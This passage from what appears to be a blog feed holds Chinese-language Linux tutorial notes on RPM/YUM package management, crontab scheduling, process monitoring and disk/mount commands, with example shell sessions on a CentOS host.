        <content type="html"><![CDATA[<h1 id="一：RPM"><a href="#一：RPM" class="headerlink" title="一：RPM"></a>一：RPM</h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><ul><li><p>RPM（RedHat Package Manager），RedHat软件包管理工具。</p></li><li><p>RPM包的名称格式 </p><ul><li>Apache-1.3.23-11.i386.rpm </li><li>“apache” 软件名称 </li><li>“1.3.23-11”软件的版本号，主版本和此版本 </li><li>“i386”是软件所运行的硬件平台，Intel 32位处理器的统称  </li><li>“rpm”文件扩展名，代表RPM包</li></ul></li></ul><h2 id="1-2-RPM-查询命令（rpm-qa）"><a href="#1-2-RPM-查询命令（rpm-qa）" class="headerlink" title="1.2 RPM 查询命令（rpm -qa）"></a>1.2 RPM 查询命令（rpm -qa）</h2><ul><li>rpm -qa （功能描述：查询所安装的所有 rpm 软件包）</li><li>由于软件包比较多，一般都会采取过滤。<ul><li>rpm -qa | grep rpm软件包</li></ul></li></ul><p>查看应用详细信息：</p><p><img src="/blog/88d9b703.html/image-20221204164849700.png"></p><h2 id="1-3-RPM-卸载命令（rpm-e）"><a href="#1-3-RPM-卸载命令（rpm-e）" class="headerlink" title="1.3 RPM 卸载命令（rpm -e）"></a>1.3 RPM 卸载命令（rpm -e）</h2><h3 id="（1）基本语法"><a href="#（1）基本语法" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h3><ul><li>rpm -e RPM软件包 </li><li>rpm -e –nodeps 软件包</li></ul><h3 id="（2）选项说明"><a href="#（2）选项说明" class="headerlink" title="（2）选项说明"></a>（2）选项说明</h3><ul><li>-e 卸载软件包</li><li>–nodeps 卸载软件时，不检查依赖。可能会导致某些依赖其的软件不能正常运行</li></ul><h2 id="1-4-RPM-安装命令（rpm-ivh）"><a href="#1-4-RPM-安装命令（rpm-ivh）" class="headerlink" title="1.4 RPM 安装命令（rpm -ivh）"></a>1.4 RPM 安装命令（rpm -ivh）</h2><h3 id="（1）基本语法-1"><a href="#（1）基本语法-1" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h3><ul><li>rpm -ivh RPM 包全名</li></ul><h3 id="（2）选项说明-1"><a href="#（2）选项说明-1" class="headerlink" title="（2）选项说明"></a>（2）选项说明</h3><p><img src="/blog/88d9b703.html/image-20221204164127004.png"></p><h1 id="二：YUM"><a href="#二：YUM" class="headerlink" title="二：YUM"></a>二：YUM</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><ul><li>YUM（全称为 Yellow dog Updater, Modified）是一个在 Fedora 和 RedHat 以及 CentOS 中的 Shell 前端软件包管理器。基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包 并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次 次下载、安装。</li><li>类比 maven；</li></ul><h2 id="2-2-YUM-的常用命令"><a href="#2-2-YUM-的常用命令" class="headerlink" title="2.2 YUM 的常用命令"></a>2.2 YUM 的常用命令</h2><h3 id="（1）基本语法-2"><a href="#（1）基本语法-2" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h3><ul><li>yum [选项] [参数]</li></ul><h3 id="（2）选项说明-2"><a href="#（2）选项说明-2" class="headerlink" title="（2）选项说明"></a>（2）选项说明</h3><p><img src="/blog/88d9b703.html/image-20221204164307426.png"></p><h3 id="（3）参数说明"><a href="#（3）参数说明" class="headerlink" title="（3）参数说明"></a>（3）参数说明</h3><p><img src="/blog/88d9b703.html/image-20221204164320962.png"></p><h2 id="2-3-修改网络-YUM-源"><a href="#2-3-修改网络-YUM-源" class="headerlink" title="2.3 修改网络 YUM 源"></a>2.3 修改网络 YUM 源</h2><ul><li>安装 wget, wget 用来从指定的 URL 下载文件；<ul><li>yum install wget</li></ul></li><li>在&#x2F;etc&#x2F;yum.repos.d&#x2F;目录下，备份默认的 repos 文件；<ul><li>cp CentOS-Base.repo CentOS-Base.repo.backup</li></ul></li><li>下载网易 163 或者是 aliyun 的 repos 文件,任选其一<ul><li>wget <a href="http://mirrors.aliyun.com/repo/Centos-7.repo">http://mirrors.aliyun.com/repo/Centos-7.repo</a></li><li>wget <a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo">http://mirrors.163.com/.help/CentOS7-Base-163.repo</a></li></ul></li><li>替换默认的yum源文件<ul><li>mv CentOS7.repo CentOS-Base.rep</li><li>mv CentOS7-Base-163.repo CentOS-Base.rep</li></ul></li><li>清理旧缓存数据，缓存新数据<ul><li>yum clean all</li><li>yum makecache（服务器的包信息下载到本地电脑缓存起来）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 定时任务</title>
      <link href="/blog/f0317602.html/"/>
      <url>/blog/f0317602.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：crontab-服务管理"><a href="#一：crontab-服务管理" class="headerlink" title="一：crontab 服务管理"></a>一：crontab 服务管理</h1><h2 id="1-1-查看当前-crond-服务状态"><a href="#1-1-查看当前-crond-服务状态" class="headerlink" title="1.1 查看当前 crond 服务状态"></a>1.1 查看当前 crond 服务状态</h2><p><img src="/blog/f0317602.html/image-20221204160114196.png"></p><h2 id="1-2-重新启动-crond-服务"><a href="#1-2-重新启动-crond-服务" class="headerlink" title="1.2 重新启动 crond 服务"></a>1.2 重新启动 crond 服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# systemctl restart crond</span><br></pre></td></tr></table></figure><h1 id="二：crontab-定时任务设置"><a href="#二：crontab-定时任务设置" class="headerlink" title="二：crontab 定时任务设置"></a>二：crontab 定时任务设置</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><ul><li>crontab [选项]</li></ul><h2 id="2-2-选项说明"><a href="#2-2-选项说明" class="headerlink" title="2.2 选项说明"></a>2.2 选项说明</h2><p><img src="/blog/f0317602.html/image-20221204160259037.png"></p><h2 id="2-3-参数说明"><a href="#2-3-参数说明" class="headerlink" title="2.3 参数说明"></a>2.3 参数说明</h2><p>crontab -e 进入编辑界面。会打开 vim 编辑定时任务。</p><h2 id="2-4-时间表示格式"><a href="#2-4-时间表示格式" class="headerlink" title="2.4 时间表示格式"></a>2.4 时间表示格式</h2><p><img src="/blog/f0317602.html/image-20221204160421719.png"></p><h2 id="2-5-特殊符号含义"><a href="#2-5-特殊符号含义" class="headerlink" title="2.5 特殊符号含义"></a>2.5 特殊符号含义</h2><p><img src="/blog/f0317602.html/image-20221204160518568.png"></p><h2 id="2-6-特定时间执行命令"><a href="#2-6-特定时间执行命令" class="headerlink" title="2.6 特定时间执行命令"></a>2.6 特定时间执行命令</h2><ul><li>每天8点整执行命令：0 8 * * * 命令；</li><li>每周一6点执行命令：0 6 * * 1 命令；</li><li>每月1号和15号凌晨5点执行命令：0 5 1,15 * * 命令；</li><li>每周一到周五凌晨3点执行命令：0 3 * * 1-5 命令；</li></ul><h2 id="2-7-案例操作"><a href="#2-7-案例操作" class="headerlink" title="2.7 案例操作"></a>2.7 案例操作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# crontab -e </span><br><span class="line">[root@hadoop100 ~]# crontab -l</span><br><span class="line">*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /root/hello.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清空当前用户 所有定时任务</span></span><br><span class="line">[root@hadoop100 ~]# crontab -r</span><br><span class="line">[root@hadoop100 ~]# crontab -l</span><br><span class="line">no crontab for root</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 进程管理类</title>
      <link href="/blog/2aa41515.html/"/>
      <url>/blog/2aa41515.html/</url>
      
        <content type="html"><![CDATA[<p>​进程是正在执行的一个程序或命令，每一个进程都是一个运行的实体，都有自己的地 址空间，并占用一定的系统资源。</p><h1 id="一：ps-查看当前系统进程状态"><a href="#一：ps-查看当前系统进程状态" class="headerlink" title="一：ps 查看当前系统进程状态"></a>一：ps 查看当前系统进程状态</h1><h2 id="1-1-基本语法"><a href="#1-1-基本语法" class="headerlink" title="1.1 基本语法"></a>1.1 基本语法</h2><ul><li>ps:process status 进程状态</li><li>ps aux | grep xxx （功能描述：查看系统中所有进程） </li><li>ps -ef | grep xxx （功能描述：可以查看子父进程之间的关系）</li></ul><h2 id="1-2-选项说明"><a href="#1-2-选项说明" class="headerlink" title="1.2 选项说明"></a>1.2 选项说明</h2><p><img src="/blog/2aa41515.html/image-20221204152036824.png"></p><h2 id="1-3-功能说明"><a href="#1-3-功能说明" class="headerlink" title="1.3 功能说明"></a>1.3 功能说明</h2><h3 id="（1）ps-aux-显示信息说明"><a href="#（1）ps-aux-显示信息说明" class="headerlink" title="（1）ps aux 显示信息说明"></a>（1）ps aux 显示信息说明</h3><ul><li>USER：该进程是由哪个用户产生的</li><li>PID：进程的 ID 号</li><li>%CPU：该进程占用 CPU 资源的百分比，占用越高，进程越耗费资源；</li><li>%MEM：该进程占用物理内存的百分比，占用越高，进程越耗费资源；</li><li>VSZ：该进程占用虚拟内存的大小，单位 KB；</li><li>RSS：该进程占用实际物理内存的大小，单位 KB；</li><li>TTY：该进程是在哪个终端中运行的。<ul><li>tty1 是图形化终端；</li><li>tty2-tty6 是本地的字符界面终端</li><li>pts&#x2F;0-255 代表虚拟终端</li></ul></li><li>STAT：进程状态。<ul><li>常见的状态有：<ul><li>R：运行状态、</li><li>S：睡眠状态、</li><li>T：暂停状态、</li><li>Z：僵尸状态、</li><li>s：包含子进程、</li><li>l：多线程、</li><li>+：前台显示</li><li>&lt;：表示高优先级</li><li>N：表示低优先级</li></ul></li></ul></li><li>START：该进程的启动时间</li><li>TIME：该进程占用 CPU 的运算时间，注意不是系统时间</li><li>COMMAND：产生此进程的命令名</li></ul><p><img src="/blog/2aa41515.html/image-20221204152147201.png"></p><p>systemd：系统的1号进程；</p><p>kthreadd：系统线程管理；</p><h3 id="（2）ps-ef-显示信息说明"><a href="#（2）ps-ef-显示信息说明" class="headerlink" title="（2）ps -ef  显示信息说明"></a>（2）ps -ef  显示信息说明</h3><ul><li>UID：用户 ID </li><li>PID：进程 ID </li><li>PPID：父进程 ID </li><li>C：CPU 用于计算执行优先级的因子。数值越大，表明进程是 CPU 密集型运算， 执行优先级会降低；数值越小，表明进程是 I&#x2F;O 密集型运算，执行优先级会提高 </li><li>STIME：进程启动的时间 </li><li>TTY：完整的终端名称 </li><li>TIME：CPU 时间 </li><li>CMD：启动进程所用的命令和参数</li></ul><p><img src="/blog/2aa41515.html/image-20221204152737678.png"></p><h3 id="（2）经验汇总"><a href="#（2）经验汇总" class="headerlink" title="（2）经验汇总"></a>（2）经验汇总</h3><ul><li><p>如果想查看进程的 CPU 占用率和内存占用率，可以使用 aux; </p></li><li><p>如果想查看进程的父进程 ID 可以使用 -ef;</p></li></ul><h1 id="二：-kill-终止进程"><a href="#二：-kill-终止进程" class="headerlink" title="二： kill 终止进程"></a>二： kill 终止进程</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><ul><li>kill [选项] 进程号 （功能描述：通过进程号杀死进程） </li><li>killall 进程名称 （功能描述：通过进程名称杀死进程，也支持通配符，这在系统因负载过大而变得很慢时很有用）</li></ul><h2 id="2-2-选项说明"><a href="#2-2-选项说明" class="headerlink" title="2.2 选项说明"></a>2.2 选项说明</h2><ul><li>-9 表示强迫进程立即停止，表示的是SIGKILL；</li></ul><p><img src="/blog/2aa41515.html/image-20221204153049379.png"></p><h1 id="三：pstree-查看进程树"><a href="#三：pstree-查看进程树" class="headerlink" title="三：pstree 查看进程树"></a>三：pstree 查看进程树</h1><h2 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h2><ul><li>pstree [选项]</li></ul><h2 id="3-2-选项说明"><a href="#3-2-选项说明" class="headerlink" title="3.2 选项说明"></a>3.2 选项说明</h2><ul><li>-p 显示进程的 PID </li><li>-u 显示进程的所属用户</li></ul><h2 id="3-3-案例操作"><a href="#3-3-案例操作" class="headerlink" title="3.3 案例操作"></a>3.3 案例操作</h2><p><img src="/blog/2aa41515.html/image-20221204153408244.png"></p><h1 id="四：top-实时监控系统进程状"><a href="#四：top-实时监控系统进程状" class="headerlink" title="四：top 实时监控系统进程状"></a>四：top 实时监控系统进程状</h1><h2 id="4-1-基本语法"><a href="#4-1-基本语法" class="headerlink" title="4.1 基本语法"></a>4.1 基本语法</h2><ul><li>top [选项]</li></ul><h2 id="4-2-选项说明"><a href="#4-2-选项说明" class="headerlink" title="4.2 选项说明"></a>4.2 选项说明</h2><ul><li>-d 秒数 指定 top 命令每隔几秒更新。默认是 3 秒在 top 命令的交互模式当 中可以执行的命令；</li><li>-i 使 top 不显示任何闲置或者僵死进程；</li><li>-p 通过指定监控进程 ID 来仅仅监控某个进程的状态；</li></ul><h2 id="4-3-操作说明"><a href="#4-3-操作说明" class="headerlink" title="4.3 操作说明"></a>4.3 操作说明</h2><p><img src="/blog/2aa41515.html/image-20221204153704822.png"></p><h2 id="4-4-查询结果字段说明"><a href="#4-4-查询结果字段说明" class="headerlink" title="4.4 查询结果字段说明"></a>4.4 查询结果字段说明</h2><ul><li>第一行信息为任务队列信息<ul><li>系统当前时间</li><li>系统的运行时间</li><li>当前登录了两个用户</li><li>系统在之前 1 分钟，5 分钟，15 分钟的平均负 载。一般认为小于 1 时，负载较小。如果大于 1，系统已经超出负荷。</li></ul></li><li>第二行为进程信息<ul><li>系统中的进程总数</li><li>正在运行的进程数</li><li>睡眠的进程</li><li>正在停止的进程</li><li>僵尸进程。如果不是 0，需要手工检查僵尸进程</li></ul></li><li>第三行为CPU 信息<ul><li>用户模式占用的 CPU 百分比</li><li>系统模式占用的 CPU 百分</li><li>改变过优先级的用户进程占用的 CPU 百分</li><li>空闲 CPU 的 CPU 百分比</li><li>等待输入&#x2F;输出的进程的占用 CPU 百分</li><li>硬中断请求服务占用的 CPU 百分</li><li>软中断请求服务占用的 CPU 百分</li><li>st（Steal time）虚拟时间百分比。就是当有虚拟 机时，虚拟 CPU</li></ul></li><li>第四行为物理内存信息<ul><li>物理内存的总量，单位 KB</li><li>已经使用的物理内存数量</li><li>空闲的物理内存数量</li><li>作为缓冲的内存数量</li></ul></li><li>第五行为交换分区（swap）信息<ul><li>交换分区（虚拟内存）的总大小</li><li>已经使用的交互分区的大小</li><li>空闲交换分区的大小</li><li>作为缓存的交互分区的大小</li></ul></li></ul><p><img src="/blog/2aa41515.html/image-20221204154223283.png"></p><p>可以按 P、M、N 对查询出的进程结果进行排；</p><h1 id="五：netstat-显示网络状态和端口占用信息"><a href="#五：netstat-显示网络状态和端口占用信息" class="headerlink" title="五：netstat 显示网络状态和端口占用信息"></a>五：netstat 显示网络状态和端口占用信息</h1><h2 id="5-1-基本语法"><a href="#5-1-基本语法" class="headerlink" title="5.1 基本语法"></a>5.1 基本语法</h2><ul><li>netstat -anp | grep 进程号 （功能描述：查看该进程网络信息） </li><li>netstat –nlp | grep 端口号 （功能描述：查看网络端口号占用情况）</li></ul><h2 id="5-2-选项说明"><a href="#5-2-选项说明" class="headerlink" title="5.2 选项说明"></a>5.2 选项说明</h2><p><img src="/blog/2aa41515.html/image-20221204154323963.png"></p><h2 id="5-3-案例操作"><a href="#5-3-案例操作" class="headerlink" title="5.3 案例操作"></a>5.3 案例操作</h2><h3 id="（1）查看所有进程网络信息"><a href="#（1）查看所有进程网络信息" class="headerlink" title="（1）查看所有进程网络信息"></a>（1）查看所有进程网络信息</h3><p><img src="/blog/2aa41515.html/image-20221204154509752.png"></p><h3 id="（2）通过进程号查看sshd进程的网络信息"><a href="#（2）通过进程号查看sshd进程的网络信息" class="headerlink" title="（2）通过进程号查看sshd进程的网络信息"></a>（2）通过进程号查看sshd进程的网络信息</h3><p><img src="/blog/2aa41515.html/image-20221204154706601.png"></p><h3 id="（3）查看某端口号是否被占用"><a href="#（3）查看某端口号是否被占用" class="headerlink" title="（3）查看某端口号是否被占用"></a>（3）查看某端口号是否被占用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看53端口是否被占用</span></span><br><span class="line">netstat -nltp  | grep 53</span><br></pre></td></tr></table></figure><p><img src="/blog/2aa41515.html/image-20221204155125178.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 磁盘分区类</title>
      <link href="/blog/88f27417.html/"/>
      <url>/blog/88f27417.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：du-查看文件和目录占用的磁盘空间"><a href="#一：du-查看文件和目录占用的磁盘空间" class="headerlink" title="一：du 查看文件和目录占用的磁盘空间"></a>一：du 查看文件和目录占用的磁盘空间</h1><h2 id="1-1-基本语法"><a href="#1-1-基本语法" class="headerlink" title="1.1 基本语法"></a>1.1 基本语法</h2><ul><li>du: disk usage 磁盘占用情况</li><li>du 目录&#x2F;文件 （功能描述：显示目录下每个子目录的磁盘使用情况）</li></ul><h2 id="1-2-选项说明"><a href="#1-2-选项说明" class="headerlink" title="1.2 选项说明"></a>1.2 选项说明</h2><p><img src="/blog/88f27417.html/image-20221204130651774.png"></p><h2 id="1-3-案例操作"><a href="#1-3-案例操作" class="headerlink" title="1.3 案例操作"></a>1.3 案例操作</h2><h3 id="（1）du-h-查看当前目录容量"><a href="#（1）du-h-查看当前目录容量" class="headerlink" title="（1）du  -h  查看当前目录容量"></a>（1）du  -h  查看当前目录容量</h3><p>最后一行显示当前目录总大小；</p><p><img src="/blog/88f27417.html/image-20221204130934616.png"></p><h3 id="（2）du-ah-查看子目录及文件"><a href="#（2）du-ah-查看子目录及文件" class="headerlink" title="（2）du -ah  查看子目录及文件"></a>（2）du -ah  查看子目录及文件</h3><p><img src="/blog/88f27417.html/image-20221204131201303.png"></p><h3 id="（3）du-c-最后一行显示总大小"><a href="#（3）du-c-最后一行显示总大小" class="headerlink" title="（3）du -c  最后一行显示总大小"></a>（3）du -c  最后一行显示总大小</h3><p><img src="/blog/88f27417.html/image-20221204131359782.png"></p><h3 id="（4）du-h-–max-depth-x3D-1-统计当前目录下所有子目录信息"><a href="#（4）du-h-–max-depth-x3D-1-统计当前目录下所有子目录信息" class="headerlink" title="（4）du -h –max-depth&#x3D;1 统计当前目录下所有子目录信息"></a>（4）du -h –max-depth&#x3D;1 统计当前目录下所有子目录信息</h3><ul><li>为0是只统计当前目录；</li></ul><p><img src="/blog/88f27417.html/image-20221204131615907.png"></p><h3 id="（5）使用-tree-查看目录树"><a href="#（5）使用-tree-查看目录树" class="headerlink" title="（5）使用 tree 查看目录树"></a>（5）使用 tree 查看目录树</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# yum install tree</span><br><span class="line">[root@hadoop100 ~]# tree ./</span><br><span class="line">./</span><br><span class="line">├── anaconda-ks.cfg</span><br><span class="line">├── Ghost</span><br><span class="line">├── initial-setup-ks.cfg</span><br><span class="line">├── RupertTears</span><br><span class="line">│?? └── hello.txt</span><br><span class="line">├── vim_\347\273\203\344\271\240.txt</span><br><span class="line">├── \345\205\254\345\205\261</span><br><span class="line">├── \346\250\241\346\235\277</span><br><span class="line">├── \350\247\206\351\242\221</span><br><span class="line">├── \345\233\276\347\211\207</span><br><span class="line">├── \346\226\207\346\241\243</span><br><span class="line">├── \344\270\213\350\275\275</span><br><span class="line">├── \351\237\263\344\271\220</span><br><span class="line">└── \346\241\214\351\235\242</span><br></pre></td></tr></table></figure><h1 id="二：df-查看磁盘空间使用情况"><a href="#二：df-查看磁盘空间使用情况" class="headerlink" title="二：df 查看磁盘空间使用情况"></a>二：df 查看磁盘空间使用情况</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><ul><li><p>df: disk free 空余磁盘</p></li><li><p>df 选项 （功能描述：列出文件系统的整体磁盘使用量，检查文件系统的磁盘空间占用情况）</p></li></ul><h2 id="2-2-选项说明"><a href="#2-2-选项说明" class="headerlink" title="2.2 选项说明"></a>2.2 选项说明</h2><ul><li>-h 以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显</li></ul><h2 id="2-3-案例操作"><a href="#2-3-案例操作" class="headerlink" title="2.3 案例操作"></a>2.3 案例操作</h2><h3 id="（1）df-h查看空余磁盘"><a href="#（1）df-h查看空余磁盘" class="headerlink" title="（1）df -h查看空余磁盘"></a>（1）df -h查看空余磁盘</h3><ul><li>tmpfs：临时文件系统，即内存文件系统，swap；</li><li>shm：shared memory，共享内存，大家都可以访问这里；</li></ul><p><img src="/blog/88f27417.html/image-20221204132140425.png"></p><h3 id="（2）ls-lh-x2F-查看根目录磁盘占用情况"><a href="#（2）ls-lh-x2F-查看根目录磁盘占用情况" class="headerlink" title="（2）ls -lh &#x2F;查看根目录磁盘占用情况"></a>（2）ls -lh &#x2F;查看根目录磁盘占用情况</h3><p>这里统计的是目录的大小，，而非磁盘占用大小；</p><p><img src="/blog/88f27417.html/image-20221204132355090.png"></p><h3 id="（3）free-h-查看当前内存占用"><a href="#（3）free-h-查看当前内存占用" class="headerlink" title="（3）free -h  查看当前内存占用"></a>（3）free -h  查看当前内存占用</h3><p><img src="/blog/88f27417.html/image-20221204133504022.png"></p><h1 id="三：lsblk-查看设备挂载情"><a href="#三：lsblk-查看设备挂载情" class="headerlink" title="三：lsblk 查看设备挂载情"></a>三：lsblk 查看设备挂载情</h1><h2 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h2><ul><li>lsblk （功能描述：查看设备挂载情况）</li></ul><h2 id="3-2-选项说明"><a href="#3-2-选项说明" class="headerlink" title="3.2 选项说明"></a>3.2 选项说明</h2><ul><li>-f 查看详细的设备挂载情况，显示文件系统信息</li></ul><h2 id="3-3-案例操作"><a href="#3-3-案例操作" class="headerlink" title="3.3 案例操作"></a>3.3 案例操作</h2><h3 id="（1）查看设备挂载情况"><a href="#（1）查看设备挂载情况" class="headerlink" title="（1）查看设备挂载情况"></a>（1）查看设备挂载情况</h3><ul><li>rom：光驱类型；</li><li>mountpoint：挂载点；</li><li>sda：磁盘类型为 SCSI；<ul><li>IDE–&gt; hda</li><li>SATA &#x2F; SCSI –&gt; 第一块磁盘叫 sda，第一个分区叫 sda1，一共能分 4个分区，也可将其中一个分区分成16个逻辑分区；第二块磁盘叫 sdb，以此类推。</li><li>vda：虚拟磁盘；</li></ul></li></ul><p><img src="/blog/88f27417.html/image-20221204132835007.png"></p><p>启动图形化界面后：光驱被自动挂载：</p><p><img src="/blog/88f27417.html/image-20221204134123785.png"></p><h3 id="（2）lsblk-f-查看详细的设备挂载情况，显示文件系统信息"><a href="#（2）lsblk-f-查看详细的设备挂载情况，显示文件系统信息" class="headerlink" title="（2）lsblk -f  查看详细的设备挂载情况，显示文件系统信息"></a>（2）lsblk -f  查看详细的设备挂载情况，显示文件系统信息</h3><p><img src="/blog/88f27417.html/image-20221204133954306.png"></p><h1 id="四：mount-x2F-umount-挂载-x2F-卸载"><a href="#四：mount-x2F-umount-挂载-x2F-卸载" class="headerlink" title="四：mount&#x2F;umount 挂载&#x2F;卸载"></a>四：mount&#x2F;umount 挂载&#x2F;卸载</h1><ul><li>对于Linux用户来讲，不论有几个分区，分别分给哪一个目录使用，它总归就是一个根目录、一个独立且唯一的文件结构。 </li><li>Linux中每个分区都是用来组成整个文件系统的一部分，它在用一种叫做“挂载”的处理方法，它整个文件系统中包含了一整套的文件和目录，并将一个分区和一个目录联系起来， 要载入的那个分区将使它的存储空间在这个目录下获得。</li></ul><h2 id="4-1-基本语法"><a href="#4-1-基本语法" class="headerlink" title="4.1 基本语法"></a>4.1 基本语法</h2><ul><li>mount [-t vfstype] [-o options] device dir （功能描述：挂载设备） </li><li>umount 设备文件名或挂载点 （功能描述：卸载设备）</li></ul><h2 id="4-2-参数说明"><a href="#4-2-参数说明" class="headerlink" title="4.2 参数说明"></a>4.2 参数说明</h2><ul><li>-t vfstyp：指定文件系统的类型，通常不必指定；<ul><li>mount 会自动选择正确的类型。</li><li>常用类型有：<ul><li>光盘或光盘镜像：iso9660</li></ul></li></ul></li><li>-o option：主要用来描述设备或档案的挂接方式；<ul><li>loop：用来把一个文件当成硬盘分区挂接上系统</li><li>ro：采用只读方式挂接设备</li><li>rw：采用读写方式挂接设备<ul><li>iocharset：指定访问文件系统所用字符集</li></ul></li></ul></li><li>device：要挂接(mount)的设备</li><li>dir：设备在系统上的挂接点(mount point)</li></ul><h2 id="4-3-案例实操"><a href="#4-3-案例实操" class="headerlink" title="4.3 案例实操"></a>4.3 案例实操</h2><h3 id="（1）查看挂载详情"><a href="#（1）查看挂载详情" class="headerlink" title="（1）查看挂载详情"></a>（1）查看挂载详情</h3><p><img src="/blog/88f27417.html/image-20221204134218300.png"></p><h3 id="（2）弹出光驱，退出图形化界面"><a href="#（2）弹出光驱，退出图形化界面" class="headerlink" title="（2）弹出光驱，退出图形化界面"></a>（2）弹出光驱，退出图形化界面</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# lsblk -f</span><br><span class="line">NAME   FSTYPE  LABEL           UUID                                 MOUNTPOINT</span><br><span class="line">sda                                                                 </span><br><span class="line">├─sda1 xfs                     24b7785a-8859-4e2b-b5d6-9e6297b9bf2d /boot</span><br><span class="line">├─sda2 swap                    6328672f-80b5-4794-87c7-b37327bde79a [SWAP]</span><br><span class="line">└─sda3 xfs                     021f8456-c948-4667-8c64-09d753c0c0b8 /</span><br><span class="line">sr0    iso9660 CentOS 7 x86_64 2020-11-04-11-36-43-00      </span><br></pre></td></tr></table></figure><h3 id="（3）挂载光盘到mnt目录下的cdrom"><a href="#（3）挂载光盘到mnt目录下的cdrom" class="headerlink" title="（3）挂载光盘到mnt目录下的cdrom"></a>（3）挂载光盘到mnt目录下的cdrom</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建挂载目录</span></span><br><span class="line">[root@hadoop100 ~]# mkdir /mnt/cdrom/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂载</span></span><br><span class="line">[root@hadoop100 ~]# mount -t iso9660 -o ro /dev/cdrom /mnt/cdrom/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置光驱已连接，启动时连接，不进入图形化界面，就不会自动挂载</span></span><br><span class="line">[root@hadoop100 ~]#  ls /mnt/cdrom/</span><br><span class="line">CentOS_BuildTag  EULA  images    LiveOS    repodata              RPM-GPG-KEY-CentOS-Testing-7</span><br><span class="line">EFI              GPL   isolinux  Packages  RPM-GPG-KEY-CentOS-7  TRANS.TBL</span><br></pre></td></tr></table></figure><h3 id="（4）卸载光驱"><a href="#（4）卸载光驱" class="headerlink" title="（4）卸载光驱"></a>（4）卸载光驱</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">两者是一一对应关系，任选其一</span></span><br><span class="line">[root@hadoop100 ~]# umount /mnt/cdrom</span><br><span class="line">[root@hadoop100 ~]# umount /dev/cdrom</span><br></pre></td></tr></table></figure><h2 id="4-4-开机自动挂载"><a href="#4-4-开机自动挂载" class="headerlink" title="4.4 开机自动挂载"></a>4.4 开机自动挂载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑配置文件</span></span><br><span class="line">[root@hadoop100 ~]# vim /etc/fstab</span><br></pre></td></tr></table></figure><p><img src="/blog/88f27417.html/image-20221204140129411.png"></p><p>编辑配置文件；0 0 代表挂载优先级；</p><p><img src="/blog/88f27417.html/image-20221204140422176.png"></p><h1 id="五：fdisk-分区"><a href="#五：fdisk-分区" class="headerlink" title="五：fdisk 分区"></a>五：fdisk 分区</h1><h2 id="5-1-基本语法"><a href="#5-1-基本语法" class="headerlink" title="5.1 基本语法"></a>5.1 